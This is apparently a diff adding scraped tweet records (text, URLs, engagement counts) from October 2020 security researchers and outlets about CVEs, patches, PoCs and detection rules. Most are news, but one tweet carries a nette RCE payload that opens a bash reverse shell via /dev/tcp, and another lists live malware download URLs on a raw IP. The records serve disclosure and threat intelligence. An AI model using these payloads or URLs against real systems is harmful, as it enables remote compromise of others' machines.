+    "tweetquotes": 25,
+    "tweetreplies": 5,
+    "tweetretweets": 217,
+    "tweettext": "CVE-2020-16898 | Windows TCP/IP Remote Code Execution Vulnerability 😱\n\nhttps://t.co/0r0s1oqTDg",
+    "tweettime": "2020-10-13, 18:25:03",
+    "tweeturl": "https://twitter.com/0xdea/status/1316082539858190341",
+    "username": "0xdea"
+}
+{
+    "tweetfavorites": 52,
+    "tweetquotes": 4,
+    "tweetreplies": 2,
+    "tweetretweets": 21,
+    "tweettext": "Highlight from Patch Tuesday is CVE-2020-16898 / Bad Neighbor\n\nA RCE vulnerability exists when the Windows TCP/IP stack improperly handles ICMPv6 Router Advertisement packets that use Option Type 25 (Recursive DNS Server Option) and a length field value that is even.",
+    "tweettime": "2020-10-13, 18:06:06",
+    "tweeturl": "https://twitter.com/blueteamblog/status/1316077767805599744",
+    "username": "blueteamblog"
+}
+{
+    "expanded_url": [
+        "https://www.zdnet.com/article/microsoft-october-2020-patch-tuesday-fixes-87-vulnerabilities/"
+    ],
+    "tweetfavorites": 141,
+    "tweetquotes": 5,
+    "tweetreplies": 2,
+    "tweetretweets": 101,
+    "tweettext": "The Microsoft October Patch Tuesday security updates are out\n\n-This month we have fixes for 87 vulnerabilities\n-21 are RCEs\n-CVE-2020-16898 is probably the worst, an RCE in the Windows TCP/IP stack with a 9.8/10 CVSS score\n\nhttps://t.co/EQUMZedSLF https://t.co/geocZqAhDE",
+    "tweettime": "2020-10-13, 17:29:35",
+    "tweeturl": "https://twitter.com/campuscodi/status/1316068580585340931",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/cve-2020-16898-bad-neighbor",
+        "https://github.com/advanced-threat-research/CVE-2020-16898"
+    ],
+    "tweetfavorites": 206,
+    "tweetquotes": 9,
+    "tweetreplies": 3,
+    "tweetretweets": 135,
+    "tweettext": "#BadNeighbor is here! This is what we nicknamed the Microsoft Windows critical and wormable RCE vuln, CVE-2020-16898. McAfee ATR has released brief analysis and a Suricata rule for those unable to patch. \n\nhttps://t.co/XaocOyIv1t\nhttps://t.co/Zo8PEKUEkz\n\n#atr #badneighbor #mcafee",
+    "tweettime": "2020-10-13, 17:09:52",
+    "tweeturl": "https://twitter.com/spovolny/status/1316063618161504256",
+    "username": "spovolny"
+}
+{
+    "tweetfavorites": 54,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 8,
+    "tweettext": "Thanks to the help from @Horgh_rce, we can now confirm that we were able to attribute another Windows LPE exploit to Volodya — CVE-2017-0056. This brings the overall number of exploits we attributed to Volodya to 12. https://t.co/WRVULMLeOo",
+    "tweettime": "2020-10-12, 14:08:16",
+    "tweeturl": "https://twitter.com/EyalItkin/status/1315655528752787457",
+    "username": "EyalItkin"
+}
+{
+    "expanded_url": [
+        "https://unit42.paloaltonetworks.com/cve-2020-14386/"
+    ],
+    "tweetfavorites": 121,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 51,
+    "tweettext": "My @Unit42_Intel blog post about CVE-2020-14386: Privilege Escalation Vulnerability in the Linux kernel\nhttps://t.co/3eFaz2KwqE",
+    "tweettime": "2020-10-10, 19:01:35",
+    "tweeturl": "https://twitter.com/0xorco/status/1315004569810866176",
+    "username": "0xorco"
+}
+{
+    "expanded_url": [
+        "https://unit42.paloaltonetworks.com/cve-2020-14386/",
+        "https://www.openwall.com/lists/oss-security/2020/09/03/3"
+    ],
+    "tweetfavorites": 203,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 98,
+    "tweettext": "CVE-2020-14386: Privilege Escalation Vulnerability in the Linux kernel.\n\nBug described as a \"simple arithmetic security issue\"\n\nWrite-up: https://t.co/3iTUKjNcuh\n\nPOC: https://t.co/9NV9qTy4q5 https://t.co/NQBy4bNwQn",
+    "tweettime": "2020-10-10, 15:59:10",
+    "tweeturl": "https://twitter.com/campuscodi/status/1314958662952157184",
+    "username": "campuscodi"
+}
+{
+    "tweetfavorites": 61,
+    "tweetquotes": 2,
+    "tweetreplies": 3,
+    "tweetretweets": 32,
+    "tweettext": "New #security advisory 🥳:\n\n\"Unauthenticated Remote Code Execution in OverwolfUpdater\" - CVE-2020-25214 https://t.co/GRk1hgEERn",
+    "tweettime": "2020-10-09, 15:32:21",
+    "tweeturl": "https://twitter.com/niemand_sec/status/1314589526032080898",
+    "username": "niemand_sec"
+}
+{
+    "tweetfavorites": 691,
+    "tweetquotes": 27,
+    "tweetreplies": 11,
+    "tweetretweets": 411,
+    "tweettext": "We’re seeing more activity leveraging the CVE-2020-1472 exploit (ZeroLogon). A new campaign shrewdly poses as software updates that connect to known CHIMBORAZO (TA505) C2 infrastructure. The fake updates lead to UAC bypass and use of wscript.exe to run malicious scripts.",
+    "tweettime": "2020-10-06, 21:54:08",
+    "tweeturl": "https://twitter.com/MsftSecIntel/status/1313598440719355904",
+    "username": "MsftSecIntel"
+}
+{
+    "expanded_url": [
+        "https://msft.it/6012TamGq"
+    ],
+    "tweetfavorites": 393,
+    "tweetquotes": 32,
+    "tweetreplies": 6,
+    "tweetretweets": 286,
+    "tweettext": "MSTIC has observed activity by the nation-state actor MERCURY using the CVE-2020-1472 exploit (ZeroLogon) in active campaigns over the last 2 weeks. We strongly recommend patching. Microsoft 365 Defender customers can also refer to these detections: https://t.co/ieBj2dox78",
+    "tweettime": "2020-10-05, 22:35:00",
+    "tweeturl": "https://twitter.com/MsftSecIntel/status/1313246337153077250",
+    "username": "MsftSecIntel"
+}
+{
+    "tweetfavorites": 179,
+    "tweetquotes": 4,
+    "tweetreplies": 4,
+    "tweetretweets": 53,
+    "tweettext": "Microsoft Visual Studio Code seems to have botched the fix for CVE-2020-16881, a \"remote code execution\" vulnerability regarding \"malicious package.json files\". The patch can be trivially bypassed.  A thread 🧵",
+    "tweettime": "2020-10-02, 22:10:08",
+    "tweeturl": "https://twitter.com/justinsteven/status/1312152915344195584",
+    "username": "justinsteven"
+}
+{
+    "tweetfavorites": 251,
+    "tweetquotes": 9,
+    "tweetreplies": 7,
+    "tweetretweets": 47,
+    "tweettext": "Maybe some of you are wondering where that blog post is regarding CVE-2020-16875? Well, it turns out I managed to bypass the patch.",
+    "tweettime": "2020-10-02, 18:03:29",
+    "tweeturl": "https://twitter.com/steventseeley/status/1312090843814203392",
+    "username": "steventseeley"
+}
+{
+    "tweetfavorites": 196,
+    "tweetquotes": 3,
+    "tweetreplies": 4,
+    "tweetretweets": 22,
+    "tweettext": "Releasing a blog post detailing CVE-2020-16875 tomorrow morning, make sure your coffee is extra brewed.",
+    "tweettime": "2020-10-01, 19:56:19",
+    "tweeturl": "https://twitter.com/steventseeley/status/1311756852871471111",
+    "username": "steventseeley"
+}
+{
+    "expanded_url": [
+        "https://www.zdnet.com/article/google-discloses-windows-zero-day-exploited-in-the-wild/"
+    ],
+    "tweetfavorites": 205,
+    "tweetquotes": 13,
+    "tweetreplies": 6,
+    "tweetretweets": 101,
+    "tweettext": "NEW: Google discloses Windows zero-day exploited in the wild\n\n-Impacts Windows 7 up to the latest Windows 10\n-Used together with a Chrome zero-day (patched last week)\n\nWindows zero-day CVE: CVE-2020-17087\nChrome zero-day CVE: CVE-2020-15999 \n\nhttps://t.co/hddB1UvqXc https://t.co/y3R9sPU7z7",
+    "tweettime": "2020-10-30, 18:31:39",
+    "tweeturl": "https://twitter.com/campuscodi/status/1322244795155288064",
+    "username": "campuscodi"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 182,
+    "tweettext": "RT @benhawkes: In addition to last week's Chrome/freetype 0day (CVE-2020-15999), Project Zero also detected and reported the Windows kernel…",
+    "tweettime": "2020-10-30, 16:52:25",
+    "tweeturl": "https://twitter.com/AdmVonSchneider/status/1322219820423798786",
+    "username": "AdmVonSchneider"
+}
+{
+    "expanded_url": [
+        "https://bugs.chromium.org/p/project-zero/issues/detail?id=2104"
+    ],
+    "tweetfavorites": 339,
+    "tweetquotes": 26,
+    "tweetreplies": 3,
+    "tweetretweets": 164,
+    "tweettext": "In addition to last week's Chrome/freetype 0day (CVE-2020-15999), Project Zero also detected and reported the Windows kernel bug (CVE-2020-17087) that was used for a sandbox escape. The technical details of CVE-2020-17087 are now available here: https://t.co/bO451188Mk",
+    "tweettime": "2020-10-30, 16:00:47",
+    "tweeturl": "https://twitter.com/benhawkes/status/1322206828202127360",
+    "username": "benhawkes"
+}
+{
+    "expanded_url": [
+        "https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf"
+    ],
+    "tweetfavorites": 621,
+    "tweetquotes": 10,
+    "tweetreplies": 9,
+    "tweetretweets": 246,
+    "tweettext": "Analysis of CVE-2020-14882\nWeblogic RCE via HTTP CVSS 9.8/10\nHope you enjoy it ;)\nThanks an anonymous man for supporting!\nhttps://t.co/Olhn9oye0r",
+    "tweettime": "2020-10-28, 09:57:29",
+    "tweeturl": "https://twitter.com/testanull/status/1321390624042442753",
+    "username": "testanull"
+}
+{
+    "expanded_url": [
+        "https://github.com/rogue-kdc/CVE-2020-16939"
+    ],
+    "tweetfavorites": 54,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 17,
+    "tweettext": "GitHub - rogue-kdc/CVE-2020-16939: PoC code for CVE-2020-16939 Windows Group Policy DACL Overwrite Privilege Escalation - https://t.co/JCs5qb6d7L",
+    "tweettime": "2020-10-27, 18:37:09",
+    "tweeturl": "https://twitter.com/piedpiper1616/status/1321159014252597249",
+    "username": "piedpiper1616"
+}
+{
+    "expanded_url": [
+        "https://securitylab.github.com/research/CVE-2020-6449-exploit-chrome-uaf"
+    ],
+    "tweetfavorites": 123,
+    "tweetquotes": 3,
+    "tweetreplies": 7,
+    "tweetretweets": 45,
+    "tweettext": "In this post I'll go through the exploit of CVE-2020-6449, a use-after-free in blink that I found in March, and break PartitionAlloc in the process: https://t.co/MG7HRkGZpk",
+    "tweettime": "2020-10-27, 17:04:33",
+    "tweeturl": "https://twitter.com/mmolgtm/status/1321135708858470402",
+    "username": "mmolgtm"
+}
+{
+    "expanded_url": [
+        "https://bit.ly/3jzOoka"
+    ],
+    "tweetfavorites": 92,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 72,
+    "tweettext": "Using the Windows Group Policy client to escalate privileges. @rogue_kdc provides a guest blog and PoC showing how CVE-2020-16939 can be abused by attackers to obtain full permissions on the contents of a folder. https://t.co/0PyMPWkM8y",
+    "tweettime": "2020-10-27, 16:14:32",
+    "tweeturl": "https://twitter.com/thezdi/status/1321123122226040832",
+    "username": "thezdi"
+}
+{
+    "expanded_url": [
+        "https://research.nccgroup.com/2020/10/26/technical-advisory-pulse-connect-secure-arbitrary-file-read-via-logon-message-cve-2020-8255/",
+        "https://research.nccgroup.com/2020/10/26/technical-advisory-pulse-connect-secure-rce-via-uncontrolled-gzip-extraction-cve-2020-8260/"
+    ],
+    "tweetfavorites": 296,
+    "tweetquotes": 5,
+    "tweetreplies": 1,
+    "tweetretweets": 147,
+    "tweettext": "Just published advisories for Pulse Connect Secure CVE-2020-8260 and CVE-2020-8255. Auth file read and auth RCE.\n\nDocumenting some new RCE techniques for arbitrary file write on PCS with \n@johnnyspandex\n\nhttps://t.co/t5SUU8EACV\n\nhttps://t.co/KxO8mWYLhR",
+    "tweettime": "2020-10-26, 20:06:11",
+    "tweeturl": "https://twitter.com/buffaloverflow/status/1320819032128425984",
+    "username": "buffaloverflow"
+}
+{
+    "tweetfavorites": 52,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 16,
+    "tweettext": "Active DDoS malware payload detected:\nhttp://172.245.7.141/b\nhttp://172.245.7.141/c\nhttp://172.245.7.141/w\n\nTarget:\nTenda AC1200 router RCE (CVE-2019-5071)\nTenda AC1900 router RCE (CVE-2020-10987)\nWiFiDog RCE\n\nExploit attempt source IP: 172.245.7.141 (🇺🇸)\n#threatintel https://t.co/NFQxJamSzE",
+    "tweettime": "2020-10-25, 00:23:03",
+    "tweeturl": "https://twitter.com/bad_packets/status/1320158900251865089",
+    "username": "bad_packets"
+}
+{
+    "expanded_url": [
+        "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-17023"
+    ],
+    "tweetfavorites": 55,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 38,
+    "tweettext": "⚠️VS Codeで、悪意のある「package.json」ファイルを開くと、リモートコード実行される脆弱性が報告されています。対処方法として最新版1.50.1に更新しておきましょう‼️\n🌐CVE-2020-17023 Visual Studio JSON Remote Code Execution Vulnerability\nhttps://t.co/QPYQzDqKm7\n#VSCodejp #VSCode快適生活 https://t.co/70XRMOSxkj",
+    "tweettime": "2020-10-23, 10:33:20",
+    "tweeturl": "https://twitter.com/ayatokura/status/1319587705462747137",
+    "username": "ayatokura"
+}
+{
+    "expanded_url": [
+        "https://www.oracle.com/security-alerts/cpuoct2020.html"
+    ],
+    "tweetfavorites": 254,
+    "tweetquotes": 9,
+    "tweetreplies": 6,
+    "tweetretweets": 91,
+    "tweettext": "[Vulnerability warning] CVE-2020-14882 + CVE-2020-14883 = one Get request RCE!  Please update immediately! https://t.co/rej5WheNUY https://t.co/Jy1cAwfj0r",
+    "tweettime": "2020-10-22, 05:07:58",
+    "tweeturl": "https://twitter.com/80vul/status/1319143436159647744",
+    "username": "80vul"
+}
+{
+    "tweetfavorites": 48,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 27,
+    "tweettext": "🚨ICYMI: Chrome patched a zero-day today (CVE-2020-15999) that's being actively exploited in the wild. Update now.🚨\n\nNote Firefox uses the same vulnerable library (freetype). I can't find any info on whether Firefox is vulnerable or if they've pushed any kind of fix...",
+    "tweettime": "2020-10-21, 20:46:57",
+    "tweeturl": "https://twitter.com/KentonVarda/status/1319017350180503557",
+    "username": "KentonVarda"
+}
+{
+    "expanded_url": [
+        "https://jira.atlassian.com/browse/JRASERVER-71560"
+    ],
+    "tweetfavorites": 412,
+    "tweetquotes": 4,
+    "tweetreplies": 3,
+    "tweetretweets": 172,
+    "tweettext": "Atlassian Jira unauthenticated user enumeration (CVE-2020-14181)! Versions affected:\n\nJira &lt; 7.13.6\n8.0.0 ≤ Jira &lt; 8.5.7\n8.6.0 ≤ Jira &lt; 8.12.0\n\nDiscovered by Mikhail Klyuchnikov.\n\nAdvisory: https://t.co/Pm5Vp1JvzV\n\n/secure/ViewUserHover.jspa?username=test\nThe PoC ☝️ https://t.co/jfHgSzpFAB",
+    "tweettime": "2020-10-21, 13:59:20",
+    "tweeturl": "https://twitter.com/ptswarm/status/1318914772918767619",
+    "username": "ptswarm"
+}
+{
+    "tweetfavorites": 33,
+    "tweetquotes": 8,
+    "tweetreplies": 5,
+    "tweetretweets": 22,
+    "tweettext": "Die am 13.10. von Microsoft bereitgestellten #Sicherheitsupdates zur Behebung der kritischen #RCE #Schwachstelle CVE-2020-16952 in #SharePoint 2013-2019 wurden bislang auf fast keinem System in Deutschland eingespielt.\nPoC #Exploit-Code ist öffentlich verfügbar! #PATCHNOW! https://t.co/v6IeX7zLya",
+    "tweettime": "2020-10-21, 10:02:29",
+    "tweeturl": "https://twitter.com/certbund/status/1318855168042074117",
+    "username": "certbund"
+}
+{
+    "expanded_url": [
+        "https://github.com/GoSecure/WSuspicious/",
+        "https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/"
+    ],
+    "tweetfavorites": 92,
+    "tweetquotes": 5,
+    "tweetreplies": 0,
+    "tweetretweets": 64,
+    "tweettext": "Our CVE-2020-1013 #LPE #PoC is out: WSuspicious\nAvailable here: https://t.co/d3aZgLKi4v\nBlog post reminder: https://t.co/wztiqQ7bj8\nResearch on #WSUS is still ongoing btw 🤫",
+    "tweettime": "2020-10-20, 20:43:07",
+    "tweeturl": "https://twitter.com/GoSecure_Inc/status/1318653999600500746",
+    "username": "GoSecure_Inc"
+}
+{
+    "expanded_url": [
+        "https://www.zdnet.com/article/google-releases-chrome-security-update-to-patch-actively-exploited-zero-day/"
+    ],
+    "tweetfavorites": 153,
+    "tweetquotes": 6,
+    "tweetreplies": 2,
+    "tweetretweets": 102,
+    "tweettext": "BREAKING: Google releases Chrome security update to patch actively exploited zero-day\n\n-Google Chrome 86.0.4240.111 released with a fix\n-0day is CVE-2020-15999 (a heap buffer overflow in the FreeType font rendering library)\n\nhttps://t.co/K73F1MV64T https://t.co/f1mCDUytbC",
+    "tweettime": "2020-10-20, 20:29:17",
+    "tweeturl": "https://twitter.com/campuscodi/status/1318650517124427777",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://chromereleases.googleblog.com/2020/10/stable-channel-update-for-desktop_20.html"
+    ],
+    "tweetfavorites": 540,
+    "tweetquotes": 42,
+    "tweetreplies": 9,
+    "tweetretweets": 206,
+    "tweettext": "Project Zero discovered and reported an actively exploited 0day in freetype that was being used to target Chrome. A stable release that fixes this issue (CVE-2020-15999) is available here: https://t.co/ZRQe72Qfkh",
+    "tweettime": "2020-10-20, 19:49:10",
+    "tweeturl": "https://twitter.com/benhawkes/status/1318640422571266048",
+    "username": "benhawkes"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 363,
+    "tweettext": "RT @Adam_pi3: CVE-2020-16898 – Exploiting \"Bad Neighbor\" vulnerability. My very detailed write-up with all the caveats + PoC code\nhttps://t…",
+    "tweettime": "2020-10-20, 15:53:43",
+    "tweeturl": "https://twitter.com/binitamshah/status/1318581168313311232",
+    "username": "binitamshah"
+}
+{
+    "tweetfavorites": 41,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 12,
+    "tweettext": "CVE-2020-13957 is a pretty handy bug. Easy RCE on Solr  6/7/8x versions, pre-auth often. If the Solr version is old enough, you can even chain it with CVE-2017-3164 to exploit non-exposed instances too! \n\nNever expose your Solr API/Admin interface, even internally. It's BAD idea!",
+    "tweettime": "2020-10-20, 14:54:36",
+    "tweeturl": "https://twitter.com/hkashfi/status/1318566290647322624",
+    "username": "hkashfi"
+}
+{
+    "expanded_url": [
+        "https://medium.com/@testbnull/cve-2020-4280-ibm-qradar-java-deserialization-anlysis-and-bypass-c3fe57207057"
+    ],
+    "tweetfavorites": 46,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 15,
+    "tweettext": "A few words about the CVE-2020-4280 - IBM QRadar Java Deserialization and the patch of it\n\nhttps://t.co/oZ39hxEfr0",
+    "tweettime": "2020-10-20, 12:50:34",
+    "tweeturl": "https://twitter.com/testanull/status/1318535076926222341",
+    "username": "testanull"
+}
+{
+    "expanded_url": [
+        "https://help.rapid7.com/nexpose/en-us/release-notes/index.html?pid=6.6.49"
+    ],
+    "tweetfavorites": 183,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 78,
+    "tweettext": "Rapid7 Nexpose &lt;= 6.6.48 boolean-based #SQLi found by Mikhail Klyuchnikov.\n\n\"This vulnerability could have allowed an authenticated user with a low permission level to access resources beyond their assigned permissions.\" - Rapid7\n\nCVE-2020-7383\n\n👉https://t.co/UxdfjTvsg7 https://t.co/6SuTP77cic",
+    "tweettime": "2020-10-19, 12:02:34",
+    "tweeturl": "https://twitter.com/ptswarm/status/1318160610450984961",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "http://blog.pi3.com.pl/?p=780"
+    ],
+    "tweetfavorites": 488,
+    "tweetquotes": 9,
+    "tweetreplies": 1,
+    "tweetretweets": 249,
+    "tweettext": "Hacker publishes a detailed explanation of the exploitation of Windows TCP/IP remote code execution (CVE-2020-16898) vulnerability.\n\nhttps://t.co/P3HuTggpYY",
+    "tweettime": "2020-10-17, 06:48:33",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1317356809787592705",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "http://blog.pi3.com.pl/?p=780"
+    ],
+    "tweetfavorites": 733,
+    "tweetquotes": 9,
+    "tweetreplies": 10,
+    "tweetretweets": 363,
+    "tweettext": "CVE-2020-16898 – Exploiting \"Bad Neighbor\" vulnerability. My very detailed write-up with all the caveats + PoC code\nhttps://t.co/MhKxEvLig4",
+    "tweettime": "2020-10-16, 19:00:49",
+    "tweeturl": "https://twitter.com/Adam_pi3/status/1317178701457575936",
+    "username": "Adam_pi3"
+}
+{
+    "expanded_url": [
+        "https://gist.github.com/d4em0n/e8d209e786f63493339f2ddef4d44e3d"
+    ],
+    "tweetfavorites": 211,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 72,
+    "tweettext": "Exploit CVE-2020-8835 (another kernel bpf bug). Same approach i did exploiting CVE-2017-16995 in the previous tweet. Overwriting bpf_map ops from array_of_map to array_of_maps_map_ops to gain arbitrary write, then overwriting modprobe_path to get root\nhttps://t.co/2fn5H0NKk3 https://t.co/m1OJPxUElp",
+    "tweettime": "2020-10-16, 14:35:20",
+    "tweeturl": "https://twitter.com/n0psledbyte/status/1317111893408968704",
+    "username": "n0psledbyte"
+}
+{
+    "expanded_url": [
+        "https://blog.quarkslab.com/beware-the-bad-neighbor-analysis-and-poc-of-the-windows-ipv6-router-advertisement-vulnerability-cve-2020-16898.html"
+    ],
+    "tweetfavorites": 195,
+    "tweetquotes": 8,
+    "tweetreplies": 5,
+    "tweetretweets": 118,
+    "tweettext": "[BLOG] Beware the Bad Neighbor: Analysis and PoC of the Windows IPv6 Router Advertisement Vulnerability (CVE-2020-16898) https://t.co/YQqarGG6Hy by @fdfalcon",
+    "tweettime": "2020-10-16, 09:26:45",
+    "tweeturl": "https://twitter.com/quarkslab/status/1317034233236520960",
+    "username": "quarkslab"
+}
+{
+    "expanded_url": [
+        "https://github.com/0neb1n/CVE-2020-16947"
+    ],
+    "tweetfavorites": 214,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 82,
+    "tweettext": "CVE-2020-16947: PoC of CVE-2020-16947 (Microsoft Outlook RCE vulnerablility)\n\nhttps://t.co/0ck5mrbwaO https://t.co/AOvsBKdGVF",
+    "tweettime": "2020-10-16, 08:21:35",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1317017834791329792",
+    "username": "cyber_advising"
+}
+{
+    "tweetfavorites": 29,
+    "tweetquotes": 2,
+    "tweetreplies": 3,
+    "tweetretweets": 31,
+    "tweettext": "Am 13.10. hat Microsoft Sicherheitsupdates für kritische #RCE #Schwachstellen (CVE-2020-16951, -16952) in #SharePoint 2013-2019 veröffentlicht.\n#PoC #Exploit Code ist bereits öffentlich verfügbar.\nAktuell sind mindestens 600 SharePoint-Server in Deutschland verwundbar. #PATCHNOW! https://t.co/9tTuXR0SoY",
+    "tweettime": "2020-10-16, 05:30:02",
+    "tweeturl": "https://twitter.com/certbund/status/1316974664120492033",
+    "username": "certbund"
+}
+{
+    "expanded_url": [
+        "https://github.com/0neb1n/CVE-2020-16947"
+    ],
+    "tweetfavorites": 69,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 38,
+    "tweettext": "GitHub - 0neb1n/CVE-2020-16947: PoC of CVE-2020-16947 (Microsoft Outlook RCE vulnerablility) - https://t.co/lxlEQcBBTn",
+    "tweettime": "2020-10-16, 00:55:44",
+    "tweeturl": "https://twitter.com/piedpiper1616/status/1316905632587501569",
+    "username": "piedpiper1616"
+}
+{
+    "tweetfavorites": 505,
+    "tweetquotes": 7,
+    "tweetreplies": 5,
+    "tweetretweets": 232,
+    "tweettext": "Please make sure to patch your Windows systems. CVE-2020-16938 is no joke. Hard Drive encryption does break this attack, however, most servers and virtual machines don't have HDD encryption enabled. Patch! #ntdsdit op: @jonasLyk https://t.co/PmEfMIRMKg",
+    "tweettime": "2020-10-15, 20:28:48",
+    "tweeturl": "https://twitter.com/mubix/status/1316838457881300992",
+    "username": "mubix"
+}
+{
+    "expanded_url": [
+        "https://github.com/0neb1n/CVE-2020-16947"
+    ],
+    "tweetfavorites": 366,
+    "tweetquotes": 4,
+    "tweetreplies": 3,
+    "tweetretweets": 156,
+    "tweettext": "https://t.co/KnBoYPhfcY\nwriteup and poc of cve-2020-16947 (outlook rce vuln)",
+    "tweettime": "2020-10-15, 14:59:53",
+    "tweeturl": "https://twitter.com/0neb1n/status/1316755683065307136",
+    "username": "0neb1n"
+}
+{
+    "expanded_url": [
+        "https://srcincite.io/advisories/src-2020-0022/"
+    ],
+    "tweetfavorites": 67,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 29,
+    "tweettext": "PoC published for CVE-2020-16952, a post-auth Microsoft SharePoint RCE\n\nhttps://t.co/3P4UaMqt36 https://t.co/v6LUl0I5rx",
+    "tweettime": "2020-10-15, 10:33:49",
+    "tweeturl": "https://twitter.com/campuscodi/status/1316688725800374279",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://github.com/rapid7/metasploit-framework/pull/14265"
+    ],
+    "tweetfavorites": 41,
+    "tweetquotes": 0,
+    "tweetreplies": 2,
+    "tweetretweets": 32,
+    "tweettext": "SharePoint admins: PATCH !\nUpcoming Microsoft SharePoint Server-Side Include and ViewState RCE (CVE-2020-16952) exploit in #metasploit\n\n@msftsecurity you can update your advisory\n\nVulnerability found by @steventseeley and module by @wvuuuuuuuuuuuuu \n\nhttps://t.co/MOsRPDSHu6 https://t.co/EOKPqeUfBT",
+    "tweettime": "2020-10-15, 08:47:19",
+    "tweeturl": "https://twitter.com/ddouhine/status/1316661921974833152",
+    "username": "ddouhine"
+}
+{
+    "expanded_url": [
+        "https://www.zdnet.com/article/hacker-leaks-passwords-for-900-enterprise-vpn-servers/"
+    ],
+    "tweetfavorites": 89,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 56,
+    "tweettext": "@BleepinComputer Barnes &amp; Noble had multiple Pulse Secure VPN servers that went unpatched against CVE-2019-11510 for months. Data from their servers was found in the recent leak (https://t.co/4NtBO5Xps8) as well.",
+    "tweettime": "2020-10-15, 05:01:36",
+    "tweeturl": "https://twitter.com/bad_packets/status/1316605119564193799",
+    "username": "bad_packets"
+}
+{
+    "expanded_url": [
+        "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16922"
+    ],
+    "tweetfavorites": 87,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 52,
+    "tweettext": "The #CVE-2020-16922 is a #spoofing #vulnerability we submitted to #Microsoft. When a malicious #JAR or #HTA appended to a #CAT file properly #signed by #Microsoft, the security features to prevent improperly signed files from loading gets bypassed.\n\nhttps://t.co/HSSKidjjjX https://t.co/IxH8YH3ayS",
+    "tweettime": "2020-10-15, 04:12:57",
+    "tweeturl": "https://twitter.com/RedDrip7/status/1316592876881502208",
+    "username": "RedDrip7"
+}
+{
+    "expanded_url": [
+        "https://github.com/corelight/CVE-2020-16898"
+    ],
+    "tweetfavorites": 52,
+    "tweetquotes": 5,
+    "tweetreplies": 0,
+    "tweetretweets": 22,
+    "tweettext": "Just released a simple Zeek package that nicely detects CVE-2020-16898 AKA \"Bad Neighbor” (Windows TCP/IP Remote Code Execution vuln) https://t.co/QZiuvhPH5k @corelight_inc @ynadji",
+    "tweettime": "2020-10-14, 23:55:14",
+    "tweeturl": "https://twitter.com/benreardon/status/1316528019062710272",
+    "username": "benreardon"
+}
+{
+    "tweetfavorites": 293,
+    "tweetquotes": 2,
+    "tweetreplies": 5,
+    "tweetretweets": 80,
+    "tweettext": "Looking at patch diff of tcpip.sys, it seems \"Ipv6pHandleRouterAdvertisement()\" function which is called by \"Icmpv6ReceiveDatagrams()\" function is guilty for Microsoft Windows ICMPv6 router advertisement RCE vulnerability (CVE-2020-16898): https://t.co/9HLISvpHil",
+    "tweettime": "2020-10-14, 21:52:19",
+    "tweeturl": "https://twitter.com/hosselot/status/1316497085320097792",
+    "username": "hosselot"
+}
+{
+    "tweetfavorites": 71,
+    "tweetquotes": 4,
+    "tweetreplies": 6,
+    "tweetretweets": 13,
+    "tweettext": "Figured out CVE-2020-16898 finally. Definitely a biiiiig caveat to exploitation that nobody is talking about (and I won't mention it at the moment, sorry) https://t.co/7zwdrL1vml",
+    "tweettime": "2020-10-14, 19:29:29",
+    "tweeturl": "https://twitter.com/thracky/status/1316461143754510337",
+    "username": "thracky"
+}
+{
+    "expanded_url": [
+        "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16947"
+    ],
+    "tweetfavorites": 45,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 24,
+    "tweettext": "Microsoft is on fire lately 🔥 \n\nCVE-2020-16947 | Microsoft Outlook Remote Code Execution Vulnerability\n\nhttps://t.co/4I5ZnrNToP",
+    "tweettime": "2020-10-14, 18:20:28",
+    "tweeturl": "https://twitter.com/0xdea/status/1316443774743121920",
+    "username": "0xdea"
+}
+{
+    "expanded_url": [
+        "https://t.zsxq.com/zn2BQZr"
+    ],
+    "tweetfavorites": 260,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 119,
+    "tweettext": "CVE-2020-15227 PHP framework nette callback RCE\n\nPOC: /nette.micro?callback=shell_exec&amp;cmd=bash%20-i%20&gt;&amp;%20/dev/tcp/'+lhost+'/'+lport+'0&gt;&amp;1\n\nhttps://t.co/M4oEFOYZva https://t.co/TH5Iu9lFDP",
+    "tweettime": "2020-10-14, 16:30:52",
+    "tweeturl": "https://twitter.com/chybeta/status/1316416189527068672",
+    "username": "chybeta"
+}
+{
